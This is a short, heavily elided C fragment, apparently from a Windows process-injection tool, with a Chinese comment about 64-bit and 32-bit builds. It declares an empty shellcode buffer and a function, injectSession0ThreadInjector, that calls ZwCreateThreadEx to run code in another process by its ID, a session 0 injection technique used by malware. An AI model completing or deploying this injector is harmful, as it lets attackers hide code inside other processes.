...
unsigned char buf[] = "";
//由于该函数在64位和32位下不同，通过宏在编译时使用不同的函数定义
#ifdef _WIN64
...
BOOL injectSession0ThreadInjector(DWORD TargetPID) {
    ...
    DWORD zw_create_thread = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, 0, 0, 0, NULL);
